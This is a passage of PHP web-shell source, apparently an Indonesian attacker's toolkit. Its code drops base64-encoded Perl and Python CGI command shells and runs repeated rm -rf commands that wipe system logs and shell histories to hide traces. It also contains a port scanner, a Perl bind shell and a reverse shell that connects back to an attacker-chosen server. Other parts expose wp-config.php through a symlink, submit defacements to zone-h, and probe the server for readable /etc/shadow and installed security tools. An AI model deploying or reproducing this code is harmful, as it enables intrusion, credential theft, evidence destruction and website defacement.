iKSAjIHVzZXIgd2FudHMgdG8gZG93bmxvYWQgYSBmaWxlDQp7DQomRG93bmxvYWRGaWxlOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAic3ltY29uZmlnIikNCnsNCiZQcmludFBhZ2VIZWFkZXI7DQpwcmludCAmU3ltQ29uZmlnOw0KfWVsc2lmKCRBY3Rpb24gZXEgImhlbHAiKQ0Kew0KJlByaW50UGFnZUhlYWRlcjsNCnByaW50ICZIZWxwOw0KfQ==";
      $cgi = fopen($file_cgi, "w");
      fwrite($cgi, base64_decode($cgi_script));
      fwrite($htcgi, $isi_htcgi);
      chmod($file_cgi, 0755);
            chmod($memeg, 0755);
      echo "<br><center>Done ... <a href='santuy_cgi/cgi2.santuy' target='_blank'>Klik Here</a>";
      echo "<br>";
  } elseif($_GET['do'] == 'cgipy') {
    $cgi_dir = mkdir('santuy_cgi', 0755);
        chdir('santuy_cgi');
    $file_cgi = "cgipy.santuy";
        $memeg = ".htaccess";
    $isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .santuy \n AddHandler cgi-script .santuy \n AddHandler cgi-script .santuy";
    $htcgi = fopen(".htaccess", "w");
    $cgi_script = "IyEvdXNyL2Jpbi9weXRob24NCiMgMDctMDctMDQNCiMgdjEuMC4wDQoNCiMgY2dpLXNoZWxsLnB5DQojIEEgc2ltcGxlIENHSSB0aGF0IGV4ZWN1dGVzIGFyYml0cmFyeSBzaGVsbCBjb21tYW5kcy4NCg0KDQojIENvcHlyaWdodCBNaWNoYWVsIEZvb3JkDQojIFlvdSBhcmUgZnJlZSB0byBtb2RpZnksIHVzZSBhbmQgcmVsaWNlbnNlIHRoaXMgY29kZS4NCg0KIyBObyB3YXJyYW50eSBleHByZXNzIG9yIGltcGxpZWQgZm9yIHRoZSBhY2N1cmFjeSwgZml0bmVzcyB0byBwdXJwb3NlIG9yIG90aGVyd2lzZSBmb3IgdGhpcyBjb2RlLi4uLg0KIyBVc2UgYXQgeW91ciBvd24gcmlzayAhISENCg0KIyBFLW1haWwgbWljaGFlbCBBVCBmb29yZCBET1QgbWUgRE9UIHVrDQojIE1haW50YWluZWQgYXQgd3d3LnZvaWRzcGFjZS5vcmcudWsvYXRsYW50aWJvdHMvcHl0aG9udXRpbHMuaHRtbA0KDQoiIiINCkEgc2ltcGxlIENHSSBzY3JpcHQgdG8gZXhlY3V0ZSBzaGVsbCBjb21tYW5kcyB2aWEgQ0dJLg0KIiIiDQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjDQojIEltcG9ydHMNCnRyeToNCiAgICBpbXBvcnQgY2dpdGI7IGNnaXRiLmVuYWJsZSgpDQpleGNlcHQ6DQogICAgcGFzcw0KaW1wb3J0IHN5cywgY2dpLCBvcw0Kc3lzLnN0ZGVyciA9IHN5cy5zdGRvdXQNCmZyb20gdGltZSBpbXBvcnQgc3RyZnRpbWUNCmltcG9ydCB0cmFjZWJhY2sNCmZyb20gU3RyaW5nSU8gaW1wb3J0IFN0cmluZ0lPDQpmcm9tIHRyYWNlYmFjayBpbXBvcnQgcHJpbnRfZXhjDQoNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCiMgY29uc3RhbnRzDQoNCmZvbnRsaW5lID0gJzxGT05UIENPTE9SPSM0MjQyNDIgc3R5bGU9ImZvbnQtZmFtaWx5OnRpbWVzO2ZvbnQtc2l6ZToxMnB0OyI+Jw0KdmVyc2lvbnN0cmluZyA9ICdWZXJzaW9uIDEuMC4wIDd0aCBKdWx5IDIwMDQnDQoNCmlmIG9zLmVudmlyb24uaGFzX2tleSgiU0NSSVBUX05BTUUiKToNCiAgICBzY3JpcHRuYW1lID0gb3MuZW52aXJvblsiU0NSSVBUX05BTUUiXQ0KZWxzZToNCiAgICBzY3JpcHRuYW1lID0gIiINCg0KTUVUSE9EID0gJyJQT1NUIicNCg0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KIyBQcml2YXRlIGZ1bmN0aW9ucyBhbmQgdmFyaWFibGVzDQoNCmRlZiBnZXRmb3JtKHZhbHVlbGlzdCwgdGhlZm9ybSwgbm90cHJlc2VudD0nJyk6DQogICAgIiIiVGhpcyBmdW5jdGlvbiwgZ2l2ZW4gYSBDR0kgZm9ybSwgZXh0cmFjdHMgdGhlIGRhdGEgZnJvbSBpdCwgYmFzZWQgb24NCiAgICB2YWx1ZWxpc3QgcGFzc2VkIGluLiBBbnkgbm9uLXByZXNlbnQgdmFsdWVzIGFyZSBzZXQgdG8gJycgLSBhbHRob3VnaCB0aGlzIGNhbiBiZSBjaGFuZ2VkLg0KICAgIChlLmcuIHRvIHJldHVybiBOb25lIHNvIHlvdSBjYW4gdGVzdCBmb3IgbWlzc2luZyBrZXl3b3JkcyAtIHdoZXJlICcnIGlzIGEgdmFsaWQgYW5zd2VyIGJ1dCB0byBoYXZlIHRoZSBmaWVsZCBtaXNzaW5nIGlzbid0LikiIiINCiAgICBkYXRhID0ge30NCiAgICBmb3IgZmllbGQgaW4gdmFsdWVsaXN0Og0KICAgICAgICBpZiBub3QgdGhlZm9ybS5oYXNfa2V5KGZpZWxkKToNCiAgICAgICAgICAgIGRhdGFbZmllbGRdID0gbm90cHJlc2VudA0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgaWYgIHR5cGUodGhlZm9ybVtmaWVsZF0pICE9IHR5cGUoW10pOg0KICAgICAgICAgICAgICAgIGRhdGFbZmllbGRdID0gdGhlZm9ybVtmaWVsZF0udmFsdWUNCiAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgdmFsdWVzID0gbWFwKGxhbWJkYSB4OiB4LnZhbHVlLCB0aGVmb3JtW2ZpZWxkXSkgICAgICMgYWxsb3dzIGZvciBsaXN0IHR5cGUgdmFsdWVzDQogICAgICAgICAgICAgICAgZGF0YVtmaWVsZF0gPSB2YWx1ZXMNCiAgICByZXR1cm4gZGF0YQ0KDQoNCnRoZWZvcm1oZWFkID0gIiIiPEhUTUw+PEhFQUQ+PFRJVExFPmNnaS1zaGVsbC5weSAtIGEgQ0dJIGJ5IEZ1enp5bWFuPC9USVRMRT48L0hFQUQ+DQo8Qk9EWT48Q0VOVEVSPg0KPEgxPldlbGNvbWUgdG8gY2dpLXNoZWxsLnB5IC0gPEJSPmEgUHl0aG9uIENHSTwvSDE+DQo8Qj48ST5CeSBGdXp6eW1hbjwvQj48L0k+PEJSPg0KIiIiK2ZvbnRsaW5lICsiVmVyc2lvbiA6ICIgKyB2ZXJzaW9uc3RyaW5nICsgIiIiLCBSdW5uaW5nIG9uIDogIiIiICsgc3RyZnRpbWUoJyVJOiVNICVwLCAlQSAlZCAlQiwgJVknKSsnLjwvQ0VOVEVSPjxCUj4nDQoNCnRoZWZvcm0gPSAiIiI8SDI+RW50ZXIgQ29tbWFuZDwvSDI+DQo8Rk9STSBNRVRIT0Q9XCIiIiIgKyBNRVRIT0QgKyAnIiBhY3Rpb249IicgKyBzY3JpcHRuYW1lICsgIiIiXCI+DQo8aW5wdXQgbmFtZT1jbWQgdHlwZT10ZXh0PjxCUj4NCjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iU3VibWl0Ij48QlI+DQo8L0ZPUk0+PEJSPjxCUj4iIiINCmJvZHllbmQgPSAnPC9CT0RZPjwvSFRNTD4nDQplcnJvcm1lc3MgPSAnPENFTlRFUj48SDI+U29tZXRoaW5nIFdlbnQgV3Jvbmc8L0gyPjxCUj48UFJFPicNCg0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KIyBtYWluIGJvZHkgb2YgdGhlIHNjcmlwdA0KDQppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOg0KICAgIHByaW50ICJDb250ZW50LXR5cGU6IHRleHQvaHRtbCIgICAgICAgICAjIHRoaXMgaXMgdGhlIGhlYWRlciB0byB0aGUgc2VydmVyDQogICAgcHJpbnQgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgc28gaXMgdGhpcyBibGFuayBsaW5lDQogICAgZm9ybSA9IGNnaS5GaWVsZFN0b3JhZ2UoKQ0KICAgIGRhdGEgPSBnZXRmb3JtKFsnY21kJ10sZm9ybSkNCiAgICB0aGVjbWQgPSBkYXRhWydjbWQnXQ0KICAgIHByaW50IHRoZWZvcm1oZWFkDQogICAgcHJpbnQgdGhlZm9ybQ0KICAgIGlmIHRoZWNtZDoNCiAgICAgICAgcHJpbnQgJzxIUj48QlI+PEJSPicNCiAgICAgICAgcHJpbnQgJzxCPkNvbW1hbmQgOiAnLCB0aGVjbWQsICc8QlI+PEJSPicNCiAgICAgICAgcHJpbnQgJ1Jlc3VsdCA6IDxCUj48QlI+Jw0KICAgICAgICB0cnk6DQogICAgICAgICAgICBjaGlsZF9zdGRpbiwgY2hpbGRfc3Rkb3V0ID0gb3MucG9wZW4yKHRoZWNtZCkNCiAgICAgICAgICAgIGNoaWxkX3N0ZGluLmNsb3NlKCkNCiAgICAgICAgICAgIHJlc3VsdCA9IGNoaWxkX3N0ZG91dC5yZWFkKCkNCiAgICAgICAgICAgIGNoaWxkX3N0ZG91dC5jbG9zZSgpDQogICAgICAgICAgICBwcmludCByZXN1bHQucmVwbGFjZSgnXG4nLCAnPEJSPicpDQoNCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiwgZTogICAgICAgICAgICAgICAgICAgICAgIyBhbiBlcnJvciBpbiBleGVjdXRpbmcgdGhlIGNvbW1hbmQNCiAgICAgICAgICAgIHByaW50IGVycm9ybWVzcw0KICAgICAgICAgICAgZiA9IFN0cmluZ0lPKCkNCiAgICAgICAgICAgIHByaW50X2V4YyhmaWxlPWYpDQogICAgICAgICAgICBhID0gZi5nZXR2YWx1ZSgpLnNwbGl0bGluZXMoKQ0KICAgICAgICAgICAgZm9yIGxpbmUgaW4gYToNCiAgICAgICAgICAgICAgICBwcmludCBsaW5lDQoNCiAgICBwcmludCBib2R5ZW5kDQoNCg0KIiIiDQpUT0RPL0lTU1VFUw0KDQoNCg0KQ0hBTkdFTE9HDQoNCjA3LTA3LTA0ICAgICAgICBWZXJzaW9uIDEuMC4wDQpBIHZlcnkgYmFzaWMgc3lzdGVtIGZvciBleGVjdXRpbmcgc2hlbGwgY29tbWFuZHMuDQpJIG1heSBleHBhbmQgaXQgaW50byBhIHByb3BlciAnZW52aXJvbm1lbnQnIHdpdGggc2Vzc2lvbiBwZXJzaXN0ZW5jZS4uLg0KIiIi";
    $cgi = fopen($file_cgi, "w");
    fwrite($cgi, base64_decode($cgi_script));
    fwrite($htcgi, $isi_htcgi);
    chmod($file_cgi, 0755);
        chmod($memeg, 0755);
    echo "<br><center>Done ... <a href='santuy_cgi/cgipy.santuy' target='_blank'>Klik Here</a>";
    echo "<br>";
  } elseif($_GET['do'] == 'logs') {
    echo '<br><center><b><span>Delete Logs ( For Safe )</span></b><center><br>';
    echo "<style='margin: 0 auto;'><tr valign='top'><td align='left'>";      
    exec("rm -rf /tmp/logs");
    exec("rm -rf /root/.ksh_history");
    exec("rm -rf /root/.bash_history");
    exec("rm -rf /root/.bash_logout");
    exec("rm -rf /usr/local/apache/logs");
    exec("rm -rf /usr/local/apache/log");
    exec("rm -rf /var/apache/logs");
    exec("rm -rf /var/apache/log");
    exec("rm -rf /var/run/utmp");
    exec("rm -rf /var/logs");
    exec("rm -rf /var/log");
    exec("rm -rf /var/adm");
    exec("rm -rf /etc/wtmp");
    exec("rm -rf /etc/utmp");
    exec("rm -rf $HISTFILE");
    exec("rm -rf /var/log/lastlog");
    exec("rm -rf /var/log/wtmp");

    shell_exec("rm -rf /tmp/logs");
    shell_exec("rm -rf /root/.ksh_history");
    shell_exec("rm -rf /root/.bash_history");
    shell_exec("rm -rf /root/.bash_logout");
    shell_exec("rm -rf /usr/local/apache/logs");
    shell_exec("rm -rf /usr/local/apache/log");
    shell_exec("rm -rf /var/apache/logs");
    shell_exec("rm -rf /var/apache/log");
    shell_exec("rm -rf /var/run/utmp");
    shell_exec("rm -rf /var/logs");
    shell_exec("rm -rf /var/log");
    shell_exec("rm -rf /var/adm");
    shell_exec("rm -rf /etc/wtmp");
    shell_exec("rm -rf /etc/utmp");
    shell_exec("rm -rf $HISTFILE");
    shell_exec("rm -rf /var/log/lastlog");
    shell_exec("rm -rf /var/log/wtmp");

    passthru("rm -rf /tmp/logs");
    passthru("rm -rf /root/.ksh_history");
    passthru("rm -rf /root/.bash_history");
    passthru("rm -rf /root/.bash_logout");
    passthru("rm -rf /usr/local/apache/logs");
    passthru("rm -rf /usr/local/apache/log");
    passthru("rm -rf /var/apache/logs");
    passthru("rm -rf /var/apache/log");
    passthru("rm -rf /var/run/utmp");
    passthru("rm -rf /var/logs");
    passthru("rm -rf /var/log");
    passthru("rm -rf /var/adm");
    passthru("rm -rf /etc/wtmp");
    passthru("rm -rf /etc/utmp");
    passthru("rm -rf $HISTFILE");
    passthru("rm -rf /var/log/lastlog");
    passthru("rm -rf /var/log/wtmp");


    system("rm -rf /tmp/logs");
    sleep(2);
    echo'<br>Deleting .../tmp/logs ';
    sleep(2);

    system("rm -rf /root/.bash_history");
    sleep(2);
    echo'<p>Deleting .../root/.bash_history </p>';

    system("rm -rf /root/.ksh_history");
    sleep(2);
    echo'<p>Deleting .../root/.ksh_history </p>';

    system("rm -rf /root/.bash_logout");
    sleep(2);
    echo'<p>Deleting .../root/.bash_logout </p>';

    system("rm -rf /usr/local/apache/logs");
    sleep(2);
    echo'<p>Deleting .../usr/local/apache/logs </p>';

    system("rm -rf /usr/local/apache/log");
    sleep(2);
    echo'<p>Deleting .../usr/local/apache/log </p>';

    system("rm -rf /var/apache/logs");
    sleep(2);
    echo'<p>Deleting .../var/apache/logs </p>';

    system("rm -rf /var/apache/log");
    sleep(2);
    echo'<p>Deleting .../var/apache/log </p>';

    system("rm -rf /var/run/utmp");
    sleep(2);
    echo'<p>Deleting .../var/run/utmp </p>';

    system("rm -rf /var/logs");
    sleep(2);
    echo'<p>Deleting .../var/logs </p>';

    system("rm -rf /var/log");
    sleep(2);
    echo'<p>Deleting .../var/log </p>';

    system("rm -rf /var/adm");
    sleep(2);
    echo'<p>Deleting .../var/adm </p>';

    system("rm -rf /etc/wtmp");
    sleep(2);
    echo'<p>Deleting .../etc/wtmp </p>';

    system("rm -rf /etc/utmp");
    sleep(2);
    echo'<p>Deleting .../etc/utmp </p>';

    system("rm -rf $HISTFILE");
    sleep(2);
    echo'<p>Deleting ...$HISTFILE </p>'; 

    system("rm -rf /var/log/lastlog");
    sleep(2);
    echo'<p>Deleting .../var/log/lastlog </p>';

    system("rm -rf /var/log/wtmp");
    sleep(2);
    echo'<p>Deleting .../var/log/wtmp </p>';

    sleep(4);

    echo '<br><br><p>Your Traces Has Been Successfully Deleting ...From the Server';
    echo"</td></tr></table>";
      } elseif ($_GET['do'] == 'port') {
            echo '<div style="text-align:center"><tr>Port Scanner<td>';
            echo '<div class="content">';
            echo '<form action="" method="post">';
            if (isset($_POST['host']) && is_numeric($_POST['end']) && is_numeric($_POST['start'])) {
                $start = strip_tags($_POST['start']);
                $end = strip_tags($_POST['end']);
                $host = strip_tags($_POST['host']);
                for ($i = $start;$i <= $end;$i++) {
                    $fp = @fsockopen($host, $i, $errno, $errstr, 3);
                    if ($fp) {
                        echo 'Port ' . $i . ' is <font color=green>open</font><br>';
                    }
                    flush();
                }
            } else {
                echo '<input type="hidden" name="a" value="PortScanner"><input type="hidden" name=p1><input type="hidden" name="p2">
                  <input type="hidden" name="c" value="' . htmlspecialchars($GLOBALS['cwd']) . '">
                  <input type="hidden" name="charset" value="' . (isset($_POST['charset']) ? $_POST['charset'] : 

    '') . '">
                  Host: &nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<input type="text" style="border:0;border-bottom:1px 

    solid #292929; width:500px;" name="host" value="localhost"/><br /><br />
                  Port Start: &nbsp<input type="text" style="border:0;border-bottom:1px solid #292929; 

    width:500px;" name="start" value="0"/><br /><br />
                  Port End:&nbsp&nbsp&nbsp&nbsp<input type="text" style="border:0;border-bottom:1px solid #292929; 

    width:500px;" name="end" value="5000"/><br /><br />
                  <input type="submit" style="width: 115px; height: 20px; border-color=white;margin:10px 2px 0 

    1px;" value="Scan Ports !" />
                  </form>';
                echo '</div></table></td></div>';
            }

      } elseif($_GET['do'] == 'backconnect'){
echo "<br><br><center><form method=post>
<br>    <span>Bind port to /bin/sh [Perl]</span><br/>
    Port: <input type='text' name='port' value='443'> <input type=submit name=bpl value='>>'>
<br><br>
        <span>Back-connect</span><br/>
    Server: <input type='text' name='server' placeholder='". $_SERVER['REMOTE_ADDR'] ."'> Port: <input type='text' name='port' placeholder='443'><select class='select' name='backconnect'  style='width: 100px;' height='10'><option value='perl'>Perl</option><option value='php'>PHP</option><option value='python'>Python</option><option value='ruby'>Ruby</option></select>
   <input type=submit value='>>'>";
    if($_POST['bpl']) {
    $bp=base64_decode("IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=");
    $brt=@fopen('bp.pl','w');
fwrite($brt,$bp);
$out = exe("perl bp.pl ".$_POST['port']." 1>/dev/null 2>&1 &");
sleep(1);
echo "<pre>$out\n".exe("ps aux | grep bp.pl")."</pre>";
unlink("bp.pl");
        }
        if($_POST['backconnect'] == 'perl') {
$bc=base64_decode("IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7");
$plbc=@fopen('bc.pl','w');
fwrite($plbc,$bc);
$out = exe("perl bc.pl ".$_POST['server']." ".$_POST['port']." 1>/dev/null 2>&1 &");
sleep(1);
echo "<pre>$out\n".exe("ps aux | grep bc.pl")."</pre>";
unlink("bc.pl");
}
    } elseif ($_GET['do'] == '404'){
    @error_reporting(0);
    @ini_set('display_errors', 0); 
    echo '
    <form method="post"><br>
    File Target : <input name="dir" value="/home/user/public_html/wp-config.php">
    <br>
    <br>Save As:&nbsp&nbsp&nbsp&nbsp&nbsp <input name="jnck" value="ojayakan.txt"><br><input name="ojaykan" type="submit" value="Gass Cok!"></form><br>';
    if($_POST['ojaykan']){
    rmdir("tatsumi_symlink404");mkdir("tatsumi_symlink404", 0777);
    $dir = $_POST['dir'];
    $jnck = $_POST['jnck'];
    system("ln -s ".$dir." tatsumi_symlink404/".$jnck);
    symlink($dir,"tatsumi_symlink404/".$jnck);
    $inija = fopen("tatsumi_symlink404/.htaccess", "w");
    fwrite($inija,"ReadmeName ".$jnck."
    Options Indexes FollowSymLinks
    DirectoryIndex ngeue.htm
    AddType text/plain .php
    AddHandler text/plain .php
    Satisfy Any
    ");
    echo'
    Done... <a href="tatsumi_symlink404/" target="_blank">Click Here!</a>';
    echo "<br>";   
    }
    } elseif ($_GET['do'] == 'zip') {
        echo "<center>";
        echo "<h2>-=[Zip Menu]=-</h2>";
        function rmdir_recursive($dir) {
            foreach (scandir($dir) as $file) {
                if ('.' === $file || '..' === $file) continue;
                if (is_dir("$dir/$file")) rmdir_recursive("$dir/$file");
                else unlink("$dir/$file");
            }
            rmdir($dir);
        }
        if ($_FILES["zip_file"]["name"]) {
            $filename = $_FILES["zip_file"]["name"];
            $source = $_FILES["zip_file"]["tmp_name"];
            $type = $_FILES["zip_file"]["type"];
            $name = explode(".", $filename);
            $accepted_types = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 

'application/x-compressed');
            foreach ($accepted_types as $mime_type) {
                if ($mime_type == $type) {
                    $okay = true;
                    break;
                }
            }
            $continue = strtolower($name[1]) == 'zip' ? true : false;
            if (!$continue) {
                $message = "Itu Bukan Zip  , , GOBLOK COK";
            }
            $path = dirname(__FILE__) . '/';
            $filenoext = basename($filename, '.zip');
            $filenoext = basename($filenoext, '.ZIP');
            $targetdir = $path . $filenoext;
            $targetzip = $path . $filename;
            if (is_dir($targetdir)) rmdir_recursive($targetdir);
            mkdir($targetdir, 0777);
            if (move_uploaded_file($source, $targetzip)) {
                $zip = new ZipArchive();
                $x = $zip->open($targetzip);
                if ($x === true) {
                    $zip->extractTo($targetdir);
                    $zip->close();
                    unlink($targetzip);
                }
                $message = "<b>Sukses Cok!</b>";
            } else {
                $message = "<b>Error Jancok!</b>";
            }
        }
        echo '<table style="width:100%" border="1">
<h2>Upload And Unzip</h2><form enctype="multipart/form-data" method="post" action="">
<label>Zip File : <input type="file" name="zip_file" /></label>
<input type="submit" class="kotak" name="submit" value="Upload And Unzip" />
</form><br><br></div>';
        if ($message) echo "<p>$message</p>";
        echo "<h2>Zip Backup</h2>
<form action='' method='post'><font style='text-decoration;'>Folder:</font><br>
<input type='text' name='dir' value='$dir' style='width: 450px;' height='10'><br><br>
<font style='text-decoration;'>Save To:</font><br>
<input type='text' name='save' value='$dir/Tatsumi_backup.zip' style='width: 450px;' height='10'><br><br>
<input type='submit' name='backup' class='kotak' value='Back Up!' style='width: 215px;'></form><br><br></div>";
        if ($_POST['backup']) {
            $save = $_POST['save'];
            function Zip($source, $destination) {
                if (extension_loaded('zip') === true) {
                    if (file_exists($source) === true) {
                        $zip = new ZipArchive();
                        if ($zip->open($destination, ZIPARCHIVE::CREATE) === true) {
                            $source = realpath($source);
                            if (is_dir($source) === true) {
                                $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), 

RecursiveIteratorIterator::SELF_FIRST);
                                foreach ($files as $file) {
                                    $file = realpath($file);
                                    if (is_dir($file) === true) {
                                        $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
                                    } else if (is_file($file) === true) {
                                        $zip->addFromString(str_replace($source . '/', '', $file), 

file_get_contents($file));
                                    }
                                }
                            } else if (is_file($source) === true) {
                                $zip->addFromString(basename($source), file_get_contents($source));
                            }
                        }
                        return $zip->close();
                    }
                }
                return false;
            }
            Zip($_POST['dir'], $save);
            echo "Selese , Save To <b>$save</b>";
        }
        echo "
    <h2>Unzip Manual</h2>
    <form action='' method='post'><font style='text-decoration;'>Zip Location:</font><br>
    <input type='text' name='dir' value='$dir/file.zip' style='width: 450px;' height='10'><br><br>
    <font style='text-decoration;'>Save To:</font><br>
    <input type='text' name='save' value='$dir/Tatsumi_unzip' style='width: 450px;' height='10'><br><br>
    <input type='submit' name='extrak' class='kotak' value='Unzip!' style='width: 215px;'></form><br><br>
    </div>";
        if ($_POST['extrak']) {
            $save = $_POST['save'];
            $zip = new ZipArchive;
            $res = $zip->open($_POST['dir']);
            if ($res === TRUE) {
                $zip->extractTo($save);
                $zip->close();
                echo 'Succes , Location : <b>' . $save . '</b>';
            } else {
                echo 'Gagal Cok!';
            }
        }
        echo '</table>';
        echo "</div>";;
} elseif($_GET['do'] == 'zoneh') {
    if($_POST['submit']) {
        $domain = explode("\r\n", $_POST['url']);
        $nick =  $_POST['nick'];
        echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
        echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
        foreach($domain as $url) {
            $zoneh = zoneh($url,$nick);
            if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
                echo "$url -> <font color=lime>OK</font><br>";
            } else {
                echo "$url -> <font color=red>ERROR</font><br>";
            }
        }
    } else {
        echo "<center><form method='post'>
        Defacer: <br>
        <input type='text' name='nick' size='50' value='./p0tz'><br>
        Domains: <br>
        <textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
        <input type='submit' name='submit' value='Submit' style='width: 450px;'>
        </form>";
    }
    echo "</center>";
} elseif($_GET['mirror'] == 'defid') {
echo "
<center>
<form method='POST' action=''>
Attacker : <br><input type='text' name='nick' placeholder='isiin nickmu'><br>
Team : <br><input type='text' name='team' placeholder='isiin teammu'><br>
Sites : <br><textarea class='form-control con7' name='sites' placeholder='http://korban.com/' cols='50' rows='12'></textarea><br>
<input type='submit' name='sikat' value='Submit!!'>
</form>
</html>";
    } elseif($_GET['do'] == 'infosec') {
echo '<center>Server security information<td><div class=content>';
    function showSecParam($n, $v) {
        $v = trim($v);
        if($v) {
            echo '<span>'.$n.': </span>';
            if(strpos($v, "\n") === false)
                echo $v.'<br>';
            else
                echo '<pre class=ml1>'.$v.'</pre>';
        }
    }
    
    showSecParam('Server software', @getenv('SERVER_SOFTWARE'));
    showSecParam('Disabled PHP Functions', ($GLOBALS['disable_functions'])?$GLOBALS

['disable_functions']:'none');
    showSecParam('Open base dir', @ini_get('open_basedir'));
    showSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
    showSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
    showSecParam('cURL support', function_exists('curl_version')?'enabled':'no');
    $temp=array();
    if(function_exists('mysql_get_client_info'))
        $temp[] = "MySql (".mysql_get_client_info().")";
    if(function_exists('mssql_connect'))
        $temp[] = "MSSQL";
    if(function_exists('pg_connect'))
        $temp[] = "PostgreSQL";
    if(function_exists('oci_connect'))
        $temp[] = "Oracle";
    showSecParam('Supported databases', implode(', ', $temp));
    echo '<br>';
    
    if( $GLOBALS['os'] == 'nix' ) {
        $userful = array

('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl'

);
        $danger = array

('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','

shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sa

wmill','wormscan','ninja');
        $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
        showSecParam('Readable /etc/passwd', @is_readable('/etc/passwd')?"yes <a href='#' onclick='g

(\"FilesTools\", \"/etc/\", \"passwd\")'>[view]</a>":'no');
        showSecParam('Readable /etc/shadow', @is_readable('/etc/shadow')?"yes <a href='#' onclick='g

(\"FilesTools\", \"etc\", \"shadow\")'>[view]</a>":'no');
        showSecParam('OS version', @file_get_contents('/proc/version'));
        showSecParam('Distr name', @file_get_contents('/etc/issue.net'));
        if(!$GLOBALS['safe_mode']) {
            echo '<br>';
            $temp=array();
            foreach ($userful as $item)
                if(which($item)){$temp[]=$item;}
            showSecParam('Userful', implode(', ',$temp));
            $temp=array();
            foreach ($danger as $item)
                if(which($item)){$temp[]=$item;}
            showSecParam('Danger', implode(', ',$temp));
            $temp=array();
            foreach ($downloaders as $item) 
                if(which($item)){$temp[]=$item;}
            showSecParam('Downloaders', implode(', ',$temp));
            echo '<br/>';
            showSecParam('Hosts', @file_get_contents('/etc/hosts'));
            showSecParam('HDD space', ex('df -h'));
            showSecParam('Mount options', @file_get_contents('/etc/fstab'));
        }
    } else {
        showSecParam('OS Version',ex('ver')); 
        showSecParam('Account Settings',ex('net accounts')); 
        showSecParam('User Accounts',ex('net user'));
    }
    echo '</div></th></table>';
    echo '</div></th></table>';
